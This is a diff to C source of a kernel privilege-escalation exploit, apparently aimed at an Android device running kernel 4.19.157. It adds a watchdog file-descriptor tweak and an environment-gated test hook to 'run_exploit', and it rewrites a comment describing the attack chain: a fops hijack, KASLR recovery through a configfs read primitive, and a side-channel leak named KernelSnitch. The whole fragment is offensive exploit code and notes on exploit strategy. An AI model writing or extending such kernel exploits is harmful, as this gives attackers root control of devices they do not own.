@@ -57,6 +57,7 @@ static pid_t start_punch_watchdog(int *parent_fd) {
   pr_info("punch watchdog started pid=%d parent=%d\n", pid, parent_pid);
 
   close(pfd[0]);
+  ks_relocate_fd_min(&pfd[1], KS_FD_PROTECT_MIN);
   if (parent_fd) {
     *parent_fd = pfd[1];
   }
@@ -270,6 +271,12 @@ int run_exploit(int argc, char **argv) {
     pr_info("KS_W1_TEST mode: slide disabled, using FOPS payload only\n");
   }
 
+  if (getenv("KS_H1A_TEST") != NULL && !strcmp(getenv("KS_H1A_TEST"), "1")) { /* H1A_GATE */
+    extern int slide_h1a_punch_test(void);
+    int h1a_ret = slide_h1a_punch_test();
+    fflush(stdout);
+    _exit(h1a_ret ? 2 : 0);
+  }
   pin_to_core(CORE);
   if (!w1_test) {
     if (getenv("KS_SLIDE_TEST")) {
@@ -283,10 +290,8 @@ int run_exploit(int argc, char **argv) {
       fflush(stdout);
       _exit(0);
     }
-    /* slide pselect route is dead on alioth 4.19.157 (futex PI waiter
-     * ETIMEDOUT; the retry prepares trigger LMK under load).  Skip it
-     * entirely; KASLR is recovered by scanning the text region through
-     * the configfs read primitive after the fops hijack. */
+    /* The M2 route skips slide KASLR; the pselect/fops route itself is
+     * re-opened for M5 under ADR-0003, with KernelSnitch supplying KASLR. */
     pr_info("slide skipped; KASLR via configfs scan after fops hijack\n");
     kaslr_base = 0;
     kaslr_slide = 0;
